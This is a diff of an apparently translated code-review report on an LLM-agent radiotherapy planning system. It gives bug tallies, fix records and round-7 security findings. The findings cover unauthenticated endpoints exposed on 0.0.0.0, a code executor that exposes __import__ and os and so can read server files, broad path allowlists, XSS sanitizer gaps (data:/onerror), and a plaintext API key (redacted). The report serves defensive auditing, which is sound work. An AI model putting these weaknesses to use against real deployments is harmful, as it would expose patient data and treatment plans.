+| U-61 | memory/preference_store.py | 220-221 | **default=str silent conversion** — non-serializable types become strings. |
+| U-62 | memory/preference_store.py | 208-209 | **KeyError swallowed** — on exception the entire preference file is reset to empty. |
+| U-63 | skills/markdown_loader.py | 154-164 | **Global Loader not thread-safe** — lazy initialization without a lock. |
+| U-64 | skills/markdown_loader.py | 96-97 | **YAML scalar triggers** — a string triggers value is iterated character by character. |
+| U-65 | skills/markdown_loader.py | 118 | **BOM not handled** — a UTF-8 BOM causes the frontmatter regex to fail to match. |
+| U-66 | scripts/nnunet_infer.py | 1-7 | **No input validation/error handling** — no friendly message on ImportError when nnunetv2 is not installed. |
+| U-67 | scripts/nnunet_infer.py | 2 | **Fragile argument parsing** — `"-m" in sys.argv` matches any argument containing -m. |
+| U-68 | web/app/index.html | 5367-5370 | **escHtml does not escape single quotes** — may escape within single-quoted attributes. |
+| U-69 | brain/providers/openrouter_llm.py | 112-129 | **Client not lazily loaded** — created in __init__; construction fails when the API key is invalid. |
+| U-70 | brain/providers/mini_max_llm.py | 62-102 | **_chat can return None** — no return statement when max_retries=0. |
 
 ---
 
-### 第六轮问题统计
+### Round 6 Issue Statistics
 
-| 严重度 | 数量 | 关键发现 |
+| Severity | Count | Key Findings |
 |--------|------|----------|
-| 🔴 Critical | 3 | 质量门永远不拒绝、Provider 格式不一致(14文件)、MiniMax NameError |
-| 🟠 High | 14 | 消息总线(4)、Provider bug(6)、质量门(2)、XSS(1)、decider(1) |
-| 🟡 Medium | 34 | 消息总线(4)、Provider(5)、brain/knowledge(3)、brain/execution(3)、brain/deciders(2)、memory(6)、skills(4)、frontend(4)、config(2)、quality(1) |
-| 🔵 Low | 19 | Provider(3)、memory(5)、skills(4)、frontend(2)、scripts(2)、其他(3) |
-| **总计** | **70** | |
+| 🔴 Critical | 3 | Quality gate never rejects, Provider format inconsistent (14 files), MiniMax NameError |
+| 🟠 High | 14 | message bus (4), Provider bugs (6), quality gate (2), XSS (1), decider (1) |
+| 🟡 Medium | 34 | message bus (4), Provider (5), brain/knowledge (3), brain/execution (3), brain/deciders (2), memory (6), skills (4), frontend (4), config (2), quality (1) |
+| 🔵 Low | 19 | Provider (3), memory (5), skills (4), frontend (2), scripts (2), other (3) |
+| **Total** | **70** | |
 
-### 第六轮核实矩阵（Top 15）
+### Round 6 Verification Matrix (Top 15)
 
-| # | 问题 | 核实结果 | 动作 |
+| # | Issue | Verification Result | Action |
 |---|------|----------|------|
-| U-01 | 质量门永远不拒绝 | ✅ 确认 — APPEND-ONLY 模式，passed 始终 True | 🔴 待修复 |
-| U-02 | Provider tool call 格式不一致 | ✅ 确认 — 14 文件两种格式 | 🔴 待修复 |
-| U-03 | MiniMax NameError | ✅ 确认 — openai 作用域问题 | 🔴 待修复 |
-| U-04 | `List[any]` 类型错误 | ✅ 确认 — Python 3.9+ TypeError | 🟠 待修复 |
-| U-05 | message_bus _history 泄漏 | ✅ 确认 — 无 TTL | 🟠 待修复 |
-| U-06 | 重复 Handler 调用 | ✅ 确认 — 无去重 | 🟠 待修复 |
-| U-07 | 废弃 asyncio API | ✅ 确认 — 3.12+ RuntimeError | 🟠 待修复 |
-| U-08 | 无 Agent = 自动通过 | ✅ 确认 — fail-open 设计 | 🟠 待修复 |
-| U-15 | XSS sanitizer 不完整 | ✅ 确认 — data:/onerror 未过滤 | 🟠 待修复 |
-| U-32 | 中文 Token 估算偏差 | ✅ 确认 — //4 对中文严重不准 | 🟡 待修复 |
-| U-34 | 大小写敏感匹配 | ✅ 确认 — "CNN" != "cnn" | 🟡 待修复 |
-| U-38 | 引用不存在的工具 | ✅ 确认 — seed_planning_rl 不存在 | 🟡 待修复 |
-| U-39 | 触发词 "complex" 过宽 | ✅ 确认 — 医疗常见词 | 🟡 待修复 |
-| U-45 | 剂量单位不明 | ✅ 确认 — 0-255 归一化未文档化 | 🟡 待修复 |
-| U-46 | 相对路径模型 | ✅ 确认 — 依赖 CWD | 🟡 待修复 |
+| U-01 | Quality gate never rejects | ✅ Confirmed — APPEND-ONLY mode, passed is always True | 🔴 To be fixed |
+| U-02 | Provider tool call format inconsistent | ✅ Confirmed — two formats across 14 files | 🔴 To be fixed |
+| U-03 | MiniMax NameError | ✅ Confirmed — openai scope issue | 🔴 To be fixed |
+| U-04 | `List[any]` type error | ✅ Confirmed — Python 3.9+ TypeError | 🟠 To be fixed |
+| U-05 | message_bus _history leak | ✅ Confirmed — no TTL | 🟠 To be fixed |
+| U-06 | Duplicate Handler invocation | ✅ Confirmed — no deduplication | 🟠 To be fixed |
+| U-07 | Deprecated asyncio API | ✅ Confirmed — 3.12+ RuntimeError | 🟠 To be fixed |
+| U-08 | No Agent = automatic pass | ✅ Confirmed — fail-open design | 🟠 To be fixed |
+| U-15 | XSS sanitizer incomplete | ✅ Confirmed — data:/onerror not filtered | 🟠 To be fixed |
+| U-32 | Chinese token estimation off | ✅ Confirmed — //4 severely inaccurate for Chinese | 🟡 To be fixed |
+| U-34 | Case-sensitive matching | ✅ Confirmed — "CNN" != "cnn" | 🟡 To be fixed |
+| U-38 | References nonexistent tool | ✅ Confirmed — seed_planning_rl does not exist | 🟡 To be fixed |
+| U-39 | Trigger word "complex" too broad | ✅ Confirmed — common medical word | 🟡 To be fixed |
+| U-45 | Dose unit unclear | ✅ Confirmed — 0-255 normalization undocumented | 🟡 To be fixed |
+| U-46 | Relative path model | ✅ Confirmed — depends on CWD | 🟡 To be fixed |
 
 ---
 
-### 六轮累计统计
+### Six-Round Cumulative Statistics
 
-| 轮次 | Critical | High | Medium | Low | 总计 |
+| Round | Critical | High | Medium | Low | Total |
 |------|----------|------|--------|-----|------|
-| 第一轮 | 12 | 18 | 24 | 15 | 69 |
-| 第二轮 | 8 | 14 | 14 | 2 | 38 |
-| 第三轮 | 6 | 16 | 18 | 12 | 52 |
-| 第四轮 | — | — | — | — | (修复轮) |
-| 第五轮 | 2 | 5 | 5 | 3 | 15 |
-| 第六轮 | 3 | 14 | 34 | 19 | 70 |
-| **累计** | **31** | **67** | **95** | **51** | **244** |
-| 已修复 | 28+15 | 5+12 | 3+4 | 0 | **36+31=67** |
-| 待修复 | 16 | 50 | 88 | 51 | **177** |
+| Round 1 | 12 | 18 | 24 | 15 | 69 |
+| Round 2 | 8 | 14 | 14 | 2 | 38 |
+| Round 3 | 6 | 16 | 18 | 12 | 52 |
+| Round 4 | — | — | — | — | (fix round) |
+| Round 5 | 2 | 5 | 5 | 3 | 15 |
+| Round 6 | 3 | 14 | 34 | 19 | 70 |
+| **Cumulative** | **31** | **67** | **95** | **51** | **244** |
+| Fixed | 28+15 | 5+12 | 3+4 | 0 | **36+31=67** |
+| To be fixed | 16 | 50 | 88 | 51 | **177** |
 
 ---
 
-### 第五/六轮修复记录 (2026-06-28)
+### Round 5/6 Fix Record (2026-06-28)
 
-> 逐一验证每个问题，确认是真 bug 后修复。共验证 25 个问题，修复 18 个，跳过 7 个。
+> Verified each issue one by one and fixed it after confirming it was a real bug. 25 issues verified, 18 fixed, 7 skipped.
 
-#### 已修复 (18 个)
+#### Fixed (18)
 
-| # | 问题 | 文件 | 修复内容 |
+| # | Issue | File | Fix Content |
 |---|------|------|----------|
-| U-04 | `List[any]` 类型错误 | communication/message_bus.py:50 | `List[any]` → `List[Any]` |
-| U-05 | _history 无界增长 | communication/message_bus.py:28-32 | 添加 `max_history=1000` + 超限驱逐 |
-| U-07 | 废弃 asyncio API | communication/message_bus.py:103 | `get_event_loop()` → `get_running_loop()` |
-| U-09 | OpenAI max_retries 未使用 | brain/providers/openai_llm.py:82 | 传递 `max_retries` 给 OpenAI 客户端 |
-| U-10 | Anthropic streaming fallback 类型 | brain/providers/anthropic_llm.py:368 | 移除裸字符串 yield，统一为 dict |
-| U-11 | LocalLLM 双 /v1 | brain/providers/local_llm.py:18,41 | base_url 默认值去掉 `/v1`，models 端点修正 |
-| U-13 | QualityDecider 满分 80 | brain/deciders/quality_decider.py:21,111 | 文档修正 0-80，阈值 >=80→>=65 |
-| U-16 | kwargs 覆盖 (8 providers) | brain/providers/*.py | 8 个 Provider 重排 update 顺序 |
-| U-17 | latency_ms=0 (8 providers) | brain/providers/*.py | 8 个 Provider 添加实际延迟测量 |
-| U-32 | 中文 Token 估算 | memory/smart_context.py:169-171 | CJK 字符按 1 token/字符估算 |
-| U-34 | 大小写敏感匹配 | memory/user_profile.py:191 | 关键词列表统一小写 |
-| U-35 | 部分 lower() 缺失 | memory/user_profile.py:163-168 | 统一添加 `.lower()` |
-| U-39 | 触发词 "complex" 过宽 | skills/markdown/rl_planning.md:8 | 移除 "complex"，添加 "rl planning" |
-| U-45 | 剂量单位不明 | config/default_params.json:7 | 添加单位注释 (normalized 0-255) |
-| U-46 | 相对路径模型 | tool_factory/dose_engine/cnn_dose_engine.py:147 | 解析到项目根目录 |
-| U-50 | ui_knowledge 复制粘贴 | brain/knowledge/ui_knowledge.json:265 | 'segment' or 'segmentation' |
-| V-20 | os 在 ALLOWED_MODULES | tool_factory/code_executor/__init__.py:30 | 添加 os.remove/os.rmdir 到危险模式 |
-| V-23 | /home 路径范围过大 | web/server.py:167 | `/home` → `os.path.expanduser("~")` |
+| U-04 | `List[any]` type error | communication/message_bus.py:50 | `List[any]` → `List[Any]` |
+| U-05 | _history unbounded growth | communication/message_bus.py:28-32 | Added `max_history=1000` + over-limit eviction |
+| U-07 | Deprecated asyncio API | communication/message_bus.py:103 | `get_event_loop()` → `get_running_loop()` |
+| U-09 | OpenAI max_retries unused | brain/providers/openai_llm.py:82 | Pass `max_retries` to the OpenAI client |
+| U-10 | Anthropic streaming fallback type | brain/providers/anthropic_llm.py:368 | Removed raw string yield, unified to dict |
+| U-11 | LocalLLM double /v1 | brain/providers/local_llm.py:18,41 | Removed `/v1` from the base_url default, corrected the models endpoint |
+| U-13 | QualityDecider max score 80 | brain/deciders/quality_decider.py:21,111 | Documentation corrected to 0-80, threshold >=80→>=65 |
+| U-16 | kwargs override (8 providers) | brain/providers/*.py | Reordered the update sequence in 8 providers |
+| U-17 | latency_ms=0 (8 providers) | brain/providers/*.py | Added actual latency measurement to 8 providers |
+| U-32 | Chinese token estimation | memory/smart_context.py:169-171 | Estimate CJK characters at 1 token/character |
+| U-34 | Case-sensitive matching | memory/user_profile.py:191 | Keyword list unified to lowercase |
+| U-35 | Some lower() missing | memory/user_profile.py:163-168 | Added `.lower()` uniformly |
+| U-39 | Trigger word "complex" too broad | skills/markdown/rl_planning.md:8 | Removed "complex", added "rl planning" |
+| U-45 | Dose unit unclear | config/default_params.json:7 | Added unit comment (normalized 0-255) |
+| U-46 | Relative path model | tool_factory/dose_engine/cnn_dose_engine.py:147 | Resolve to the project root directory |
+| U-50 | ui_knowledge copy-paste | brain/knowledge/ui_knowledge.json:265 | 'segment' or 'segmentation' |
+| V-20 | os in ALLOWED_MODULES | tool_factory/code_executor/__init__.py:30 | Added os.remove/os.rmdir to dangerous patterns |
+| V-23 | /home path scope too broad | web/server.py:167 | `/home` → `os.path.expanduser("~")` |
 
-#### 跳过 (7 个 — 非真 bug 或有意设计)
+#### Skipped (7 — not real bugs or intentional design)
 
-| # | 问题 | 原因 |
+| # | Issue | Reason |
 |---|------|------|
-| U-01 | 质量门永远不拒绝 | **有意设计** — APPEND-ONLY MODE，注释明确 |
-| U-02 | Provider 格式不一致 | **非 bug** — 消费者已处理两种格式 |
-| U-03 | MiniMax NameError | **潜在缺陷** — openai 已在 requirements.txt，不会缺 |
-| U-08 | 无 Agent = 自动通过 | **有意设计** — 与 APPEND-ONLY 模式一致 |
-| U-12 | OpenRouter arguments | **非 bug** — 消费者处理 string/dict 两种 |
-| U-38/U-40 | 引用不存在工具 | **误报** — 两个工具都存在 |
-| V-14 | _global_agent | **架构设计** — web 已有 fallback，修改需大规模重构 |
+| U-01 | Quality gate never rejects | **Intentional design** — APPEND-ONLY MODE, explicitly commented |
+| U-02 | Provider format inconsistent | **Not a bug** — consumers already handle both formats |
+| U-03 | MiniMax NameError | **Potential defect** — openai is already in requirements.txt, so it will not be missing |
+| U-08 | No Agent = automatic pass | **Intentional design** — consistent with APPEND-ONLY mode |
+| U-12 | OpenRouter arguments | **Not a bug** — consumers handle both string/dict |
+| U-38/U-40 | References nonexistent tools | **False positive** — both tools exist |
+| V-14 | _global_agent | **Architecture design** — web already has a fallback; changing it requires large-scale refactoring |
 
 ---
 
-### 六轮最高优先级修复路线图（更新）
+### Six-Round Highest-Priority Fix Roadmap (Updated)
 
-| 优先级 | 问题 | 修复方案 | 状态 |
+| Priority | Issue | Fix Plan | Status |
 |--------|------|----------|------|
-| **P0** | 无 pyproject.toml (V-11) | 创建 pyproject.toml | 待修复 |
-| **P0** | sys.path 滥用 (V-09) | 配合 pyproject.toml 清理 | 待修复 |
-| **P1** | XSS sanitizer (U-15) | 补充 data:/onerror/无空格事件处理 | 待修复 |
-| **P2** | Docker 化 (T3-21) | Dockerfile + docker-compose | 待修复 |
-| **P2** | 前端模块化 (H-02) | 拆分 index.html | 待修复 |
+| **P0** | No pyproject.toml (V-11) | Create pyproject.toml | To be fixed |
+| **P0** | sys.path abuse (V-09) | Clean up alongside pyproject.toml | To be fixed |
+| **P1** | XSS sanitizer (U-15) | Add data:/onerror/whitespace-free event handler handling | To be fixed |
+| **P2** | Dockerization (T3-21) | Dockerfile + docker-compose | To be fixed |
+| **P2** | Frontend modularization (H-02) | Split index.html | To be fixed |
 
 ---
 
-**第六轮审查完成时间**: 2026-06-28  
-**审查人**: MiMo Code Agent (3 并行 Agent)  
-**审查覆盖**: 40+ 文件 / ~12000 行 / 之前未深度覆盖的模块  
-**累计审查**: 6 轮 / 244 个问题 / 67 个已修复 / 177 个待修复  
-**第五/六轮修复**: 验证 25 个问题，修复 18 个，跳过 7 个
+**Round 6 Review Completion Time**: 2026-06-28  
+**Reviewer**: MiMo Code Agent (3 parallel Agents)  
+**Review Coverage**: 40+ files / ~12000 lines / modules not deeply covered previously  
+**Cumulative Review**: 6 rounds / 244 issues / 67 fixed / 177 to be fixed  
+**Round 5/6 Fixes**: 25 issues verified, 18 fixed, 7 skipped
 
 ---
 
-## 第七轮：CodeGraph 全局审查与架构校准 (2026-06-28)
+## Round 7: CodeGraph Global Review and Architecture Calibration (2026-06-28)
 
-> 本轮按用户要求使用项目现有 CodeGraph 数据库 `.codegraph/codegraph.db` 建立全局理解，并用 AST/源码抽样交叉验证。重点不是重复前六轮的逐文件列表，而是从调用图、入口点、状态边界和当前工作树改动中确认真实高风险问题。
+> At the user's request, this round used the project's existing CodeGraph database `.codegraph/codegraph.db` to build a global understanding and cross-validated it with AST/source sampling. The focus is not to repeat the file-by-file lists of the first six rounds, but to confirm real high-risk issues from the call graph, entry points, state boundaries, and current working-tree changes.
 
-### 审查输入与可信度
+### Review Inputs and Confidence
 
-| 数据源 | 结果 | 说明 |
+| Data Source | Result | Notes |
 |--------|------|------|
-| `.codegraph/codegraph.db` | 289 files / 6022 nodes / 10498 edges | 覆盖核心 Python/JS 文件，适合做架构热点定位 |
-| CodeGraph nodes | import 1696 / variable 1570 / method 1232 / function 928 / class 260 / route 47 | Flask route、类、方法和调用边已被索引 |
-| CodeGraph edges | contains 5690 / calls 3489 / imports 620 / instantiates 548 | 足以识别高耦合模块和跨模块依赖 |
-| AST route scan | `web/server.py` 共 47 个 route | 逐个提取 decorator，验证鉴权/限流覆盖 |
-| AST/source scan | 1515 个 `.py` 文件扫描，发现后再过滤到应用代码 | 避免把 venv/vendor 噪声计入真实问题 |
-| CodeGraph daemon | 多次 `ENOSPC: System limit for number of file watchers reached` | 图快照可用，但增量同步存在遗漏风险 |
+| `.codegraph/codegraph.db` | 289 files / 6022 nodes / 10498 edges | Covers core Python/JS files, suitable for locating architectural hotspots |
+| CodeGraph nodes | import 1696 / variable 1570 / method 1232 / function 928 / class 260 / route 47 | Flask routes, classes, methods, and call edges are indexed |
+| CodeGraph edges | contains 5690 / calls 3489 / imports 620 / instantiates 548 | Sufficient to identify highly coupled modules and cross-module dependencies |
+| AST route scan | `web/server.py` has 47 routes total | Extract decorators one by one to verify auth/rate-limit coverage |
+| AST/source scan | 1515 `.py` files scanned, then filtered to application code after discovery | Avoid counting venv/vendor noise as real issues |
+| CodeGraph daemon | Multiple `ENOSPC: System limit for number of file watchers reached` | Graph snapshots are usable, but incremental sync may miss changes |
 
-### CodeGraph 全局架构理解
+### CodeGraph Global Architecture Understanding
 
 ```mermaid
 graph TD
-    UI["web/app/index.html\n单页前端 + viewer + report"] --> API["web/server.py\n47 Flask routes / session manager / SSE"]
+    UI["web/app/index.html\nsingle-page frontend + viewer + report"] --> API["web/server.py\n47 Flask routes / session manager / SSE"]
     API --> Agent["AgenticSys.py\nBrachyAgent / AgentMemory / function calling"]
     Agent --> Tools["tool_factory/*\nsegmentation / planning / executor / export"]
     Agent --> Brain["brain/*\nLLM providers / deciders / RAG / execution"]
@@ -2068,129 +2068,129 @@ graph TD
     API --> Outputs["uploads / outputs / screenshots / report export"]
 ```
 
-核心运行链路可以概括为：
+The core runtime path can be summarized as:
 
-1. `web/server.py` 是唯一主要 HTTP 边界，负责上传、影像加载、viewer 切片/体数据、规划步骤、chat、导出和状态查询。
-2. `AgenticSys.py` 是系统内核，持有 `AgentMemory`、工具注册表、LLM function-calling 循环和全局 `_global_agent` 兼容层。
-3. `tool_factory/seed_plan/planning_pipeline.py` 是治疗计划主流水线，依赖 CT、CTV、OAR、device manager 和 dose/evaluation 组件。
-4. `tool_factory/OAR_seg/totalsegmentator_oar.py`、`tool_factory/CTV_seg/*`、`plans/*` 组成影像/分割/剂量计算路径，是临床正确性最高风险区域。
-5. `brain/providers/*`、`memory/*`、`skills/*` 影响 LLM 行为和工具选择，但最终安全边界仍落在 server route、tool executor 和文件系统访问控制上。
+1. `web/server.py` is the only major HTTP boundary, responsible for uploads, image loading, viewer slices/volumes, planning steps, chat, export, and status queries.
+2. `AgenticSys.py` is the system kernel, holding `AgentMemory`, the tool registry, the LLM function-calling loop, and the global `_global_agent` compatibility layer.
+3. `tool_factory/seed_plan/planning_pipeline.py` is the main treatment planning pipeline, depending on CT, CTV, OAR, the device manager, and dose/evaluation components.
+4. `tool_factory/OAR_seg/totalsegmentator_oar.py`, `tool_factory/CTV_seg/*`, and `plans/*` form the imaging/segmentation/dose-calculation path, the highest-risk area for clinical correctness.
+5. `brain/providers/*`, `memory/*`, and `skills/*` affect LLM behavior and tool selection, but the ultimate security boundary still rests on server routes, the tool executor, and file system access control.
 
-### CodeGraph 热点文件
+### CodeGraph Hotspot Files
 
-| 排名 | 文件 | 图证据 | 风险含义 |
+| Rank | File | Graph Evidence | Risk Implication |
 |------|------|--------|----------|
-| 1 | `AgenticSys.py` | out edges 978 / in edges 1103 / unresolved refs 1691 | 系统核心，状态、工具调用、LLM 行为高度集中 |
-| 2 | `web/server.py` | 160 nodes / 47 routes / unresolved refs 1518 | 外部攻击面和状态入口高度集中 |
-| 3 | `tool_factory/seed_plan/planning_pipeline.py` | out edges 260 / 52 nodes | 规划主链路，当前工作树存在逻辑回归 |
-| 4 | `plans/utilizations.py` | 94 nodes / out edges 237 | 剂量/几何工具函数复杂度高 |
-| 5 | `tool_factory/web_search/__init__.py` | 87 nodes / in/out edges ~200 | 网络访问和证据链复杂度高 |
-| 6 | `tool_factory/env_manager/__init__.py` | out edges 102 | LLM 可触发环境/包管理，安全边界敏感 |
+| 1 | `AgenticSys.py` | out edges 978 / in edges 1103 / unresolved refs 1691 | System core; state, tool calls, and LLM behavior are highly concentrated |
+| 2 | `web/server.py` | 160 nodes / 47 routes / unresolved refs 1518 | External attack surface and state entry points are highly concentrated |
+| 3 | `tool_factory/seed_plan/planning_pipeline.py` | out edges 260 / 52 nodes | Main planning chain; the current working tree has a logic regression |
+| 4 | `plans/utilizations.py` | 94 nodes / out edges 237 | High complexity in dose/geometry utility functions |
+| 5 | `tool_factory/web_search/__init__.py` | 87 nodes / in/out edges ~200 | High complexity in network access and evidence chains |
+| 6 | `tool_factory/env_manager/__init__.py` | out edges 102 | The LLM can trigger environment/package management; sensitive security boundary |
 
 ---
 
-### Critical — 本轮新增/重新确认
+### Critical — Newly Added/Reconfirmed This Round
 
-| # | 文件 | 行号 | 问题 |
+| # | File | Lines | Issue |
 |---|------|------|------|
-| CG-01 | `web/server.py` | 34-39, 177-188, 3764-3775 | **默认外网监听 + 默认关闭 API key 鉴权**。CLI 默认 `--host 0.0.0.0`，而 `require_api_key` 只有设置 `BRACHYBOT_API_KEY` 时才真正生效；未设置时所有带 decorator 的接口也不会校验 key。CORS 不能替代鉴权，非浏览器客户端可直接调用。 |
-| CG-02 | `start_server.sh` | 7-9 | **启动脚本明文写入第三方 LLM API key**。该文件当前是 untracked，但位于项目根目录，极易被提交、截图、日志复制或 shell history 泄露。报告中已脱敏，必须轮换该 key。 |
-| CG-03 | `tool_factory/code_executor/__init__.py` | 23-35, 83-126 | **CodeExecutor 不是有效沙箱**。`ALLOWED_MODULES` 包含 `os/sys/pathlib`，`safe_builtins` 暴露 `__import__`，最终在同进程 `exec()` 运行。已用无敏感文件 `/etc/hostname` 复现：工具代码可读取服务器文件。另无真实超时/内存/CPU 隔离。 |
+| CG-01 | `web/server.py` | 34-39, 177-188, 3764-3775 | **Default external listening + API key auth disabled by default**. The CLI defaults to `--host 0.0.0.0`, while `require_api_key` only actually takes effect when `BRACHYBOT_API_KEY` is set; when unset, all decorated endpoints also skip key validation. CORS cannot replace authentication, and non-browser clients can call directly. |
+| CG-02 | `start_server.sh` | 7-9 | **Startup script writes a third-party LLM API key in plaintext**. The file is currently untracked, but it is in the project root and could easily be committed, screenshotted, copied into logs, or leaked via shell history. It is redacted in this report; the key must be rotated. |
+| CG-03 | `tool_factory/code_executor/__init__.py` | 23-35, 83-126 | **CodeExecutor is not an effective sandbox**. `ALLOWED_MODULES` contains `os/sys/pathlib`, `safe_builtins` exposes `__import__`, and it ultimately runs via in-process `exec()`. Reproduced with the non-sensitive file `/etc/hostname`: tool code can read server files. There is also no real timeout/memory/CPU isolation. |
 
-### High — 本轮新增/重新确认
+### High — Newly Added/Reconfirmed This Round
 
-| # | 文件 | 行号 | 问题 |
+| # | File | Lines | Issue |
 |---|------|------|------|
-| CG-04 | `web/server.py` | 295-386, 3575-3606 | **上传和截图写入接口无鉴权、无限流、文件类型校验不足**。`/api/upload` 保存任意文件名后缀，`/api/screenshot` 接受任意 base64 并写入磁盘；仅有全局 500MB request 上限，不限制文件数量、累计容量或 MIME/content。 |
-| CG-05 | `web/server.py` | 142-174, 583-598, 950-985, 3171-3219, 3447-3451 | **路径边界过宽且应用不一致**。`_validate_path()` allowlist 包含整个项目根和当前用户 home；`api_header_info`、`api_viewer_load` 直接读取用户提交的 `ct_path`，未调用 `_validate_path()`；`api_export_dicom_rt`、`api_export_stl` 直接 `os.makedirs(output_dir)`。这会把“只读/只写 uploads、outputs”的安全假设扩大到整个 home。 |
-| CG-06 | `web/server.py` | 2979-3001 | **`/api/config` POST 可无鉴权修改规划参数**。该接口没有 `@require_api_key` 和 `@rate_limit`，会直接覆盖 `agent.config` 中 seed、dose、RL、distance 等核心规划参数。若服务按默认 `0.0.0.0` 暴露，任何可达客户端都能影响后续计划。 |
-| CG-07 | `tool_factory/seed_plan/planning_pipeline.py` | 614-620 | **OAR auto-recovery 分支不可达**。当前工作树新增 `if oar_mask is None: return ...`，紧接着 line 620 又判断同一条件并尝试自动运行 OAR segmentation；后者永远不会执行，破坏原有 auto-recovery 行为。 |
-| CG-08 | `tool_factory/OAR_seg/totalsegmentator_oar.py` | 316-326 | **CPU fallback 被错误映射成 GPU**。当前改动中 `_dev.startswith("cuda:")` 之外的所有情况都设置 `device_str = "gpu"`；当 device manager 返回 `cpu` 时仍会执行 `TotalSegmentator --device gpu`，在无可用 GPU 或 GPU 被禁用时失败。 |
+| CG-04 | `web/server.py` | 295-386, 3575-3606 | **Upload and screenshot write endpoints lack auth, lack rate limiting, and have insufficient file type validation**. `/api/upload` saves arbitrary filename extensions, and `/api/screenshot` accepts arbitrary base64 and writes to disk; there is only a global 500MB request limit, with no limit on file count, cumulative size, or MIME/content. |
+| CG-05 | `web/server.py` | 142-174, 583-598, 950-985, 3171-3219, 3447-3451 | **Path boundaries too broad and applied inconsistently**. The `_validate_path()` allowlist includes the entire project root and the current user's home; `api_header_info` and `api_viewer_load` read the user-submitted `ct_path` directly without calling `_validate_path()`; `api_export_dicom_rt` and `api_export_stl` call `os.makedirs(output_dir)` directly. This expands the "read-only/write-only to uploads, outputs" security assumption to the entire home. |
+| CG-06 | `web/server.py` | 2979-3001 | **`/api/config` POST can modify planning parameters without auth**. This endpoint lacks `@require_api_key` and `@rate_limit` and directly overwrites core planning parameters in `agent.config` such as seed, dose, RL, and distance. If the service is exposed on the default `0.0.0.0`, any reachable client can influence subsequent plans. |
+| CG-07 | `tool_factory/seed_plan/planning_pipeline.py` | 614-620 | **OAR auto-recovery branch unreachable**. The current working tree adds `if oar_mask is None: return ...`, and line 620 immediately checks the same condition again and attempts to auto-run OAR segmentation; the latter never executes, breaking the original auto-recovery behavior. |
+| CG-08 | `tool_factory/OAR_seg/totalsegmentator_oar.py` | 316-326 | **CPU fallback incorrectly mapped to GPU**. In the current change, all cases other than `_dev.startswith("cuda:")` set `device_str = "gpu"`; when the device manager returns `cpu`, `TotalSegmentator --device gpu` still runs and fails when no GPU is available or the GPU is disabled. |
 
-### Medium — 本轮新增/重新确认
+### Medium — Newly Added/Reconfirmed This Round
 
-| # | 文件 | 行号 | 问题 |
+| # | File | Lines | Issue |
 |---|------|------|------|
-| CG-09 | `web/server.py`, `AgenticSys.py` | `web/server.py:227-266, 3756`; `AgenticSys.py:168-172, 391-404` | **Flask threaded=True 下 session/agent memory 缺少锁**。`_sessions`、`_session_timestamps`、`planning_results`、`conversation`、`_ui_state` 都会在多请求线程中读写；长耗时分割/规划与前端轮询并发时可能出现状态撕裂、旧病人数据串用或 conversation 丢失。 |
-| CG-10 | `web/server.py` | 45-95, 3351-3367 | **TaskManager/SSE 不是持续流且任务无 TTL**。`/api/tasks/stream` 只输出当前任务快照后结束，没有 heartbeat/阻塞等待；`_tasks` 只增不删，任务列表还无鉴权暴露。 |
-| CG-11 | `web/app/index.html` | 6168-6181, 6968-6976, 17643-17648 | **前端 XSS 风险应从“完全未过滤”修正为“自写 sanitizer 不足 + 局部未转义”**。LLM markdown 经过 `_sanitizeHtml()`，但正则 sanitizer 不是 DOMPurify；DVH tooltip 仍将 `traceName` 直接拼入 `innerHTML`。 |
-| CG-12 | `.codegraph/daemon.log` | tail | **CodeGraph 增量同步受 inotify watcher 上限影响**。日志反复出现 `ENOSPC: System limit for number of file watchers reached`，尤其在大量 generated evidence/json 文件下。当前 DB 可用于本轮分析，但后续依赖 CodeGraph 做“已同步最新代码”判断前，应先修复 watcher/exclude 配置。 |
+| CG-09 | `web/server.py`, `AgenticSys.py` | `web/server.py:227-266, 3756`; `AgenticSys.py:168-172, 391-404` | **Missing locks for session/agent memory under Flask threaded=True**. `_sessions`, `_session_timestamps`, `planning_results`, `conversation`, and `_ui_state` are all read and written across multiple request threads; when long-running segmentation/planning runs concurrently with frontend polling, state tearing, stale patient data cross-use, or loss of conversation may occur. |
+| CG-10 | `web/server.py` | 45-95, 3351-3367 | **TaskManager/SSE is not a continuous stream and tasks have no TTL**. `/api/tasks/stream` only outputs the current task snapshot and then ends, with no heartbeat/blocking wait; `_tasks` only grows and is never deleted, and the task list is exposed without auth. |
+| CG-11 | `web/app/index.html` | 6168-6181, 6968-6976, 17643-17648 | **Frontend XSS risk should be corrected from "completely unfiltered" to "custom sanitizer insufficient + locally unescaped"**. LLM markdown passes through `_sanitizeHtml()`, but the regex sanitizer is not DOMPurify; the DVH tooltip still concatenates `traceName` directly into `innerHTML`. |
+| CG-12 | `.codegraph/daemon.log` | tail | **CodeGraph incremental sync is affected by the inotify watcher limit**. The log repeatedly shows `ENOSPC: System limit for number of file watchers reached`, especially with many generated evidence/json files. The current DB is usable for this round's analysis, but before relying on CodeGraph to judge "latest code synced" in the future, the watcher/exclude configuration should be fixed first. |
 
 ---
 
-### 对前六轮结论的校准
+### Calibration of the First Six Rounds' Conclusions
 
-| 旧结论 | 本轮校准 |
+| Old Conclusion | This Round's Calibration |
 |--------|----------|
-| CORS 配置待核实 | 已核实：CORS 默认限制 localhost origins，但服务 CLI 默认监听 `0.0.0.0`，CORS 不能替代 API 鉴权。 |
-| `/api/status` 暴露待核实 | 已核实：`/api/status` 和 `/api/device/status` 无鉴权，会暴露 brain/provider/device 状态；单独看不是 P0，但与默认无鉴权/外网监听组合后风险升高。 |
-| LLM 工具无权限为有意设计 | 设计意图可保留，但 `code_executor` 当前宣传为 sandboxed，实际同进程读文件、无资源隔离；应修正文档或实现真沙箱。 |
-| `/home` 路径范围已修复 | 当前是 `os.path.expanduser("~")`，仍等价允许整个 `/home/user`。对医学数据读取可以讨论，对导出写路径和任意文件读取接口仍过宽。 |
-| H-10 SSE 无心跳待核实 | 已核实：`/api/tasks/stream` 只 emit 快照后结束，不是持续任务事件流；`/api/chat` 流式响应有 keep-alive header，但没有应用层 heartbeat。 |
+| CORS configuration to be verified | Verified: CORS limits localhost origins by default, but the service CLI listens on `0.0.0.0` by default; CORS cannot replace API authentication. |
+| `/api/status` exposure to be verified | Verified: `/api/status` and `/api/device/status` lack auth and expose brain/provider/device status; alone this is not P0, but combined with default no-auth/external listening the risk rises. |
+| LLM tools without permissions is intentional design | The design intent can be retained, but `code_executor` is currently advertised as sandboxed while in reality it reads files in-process with no resource isolation; the documentation should be corrected or a real sandbox implemented. |
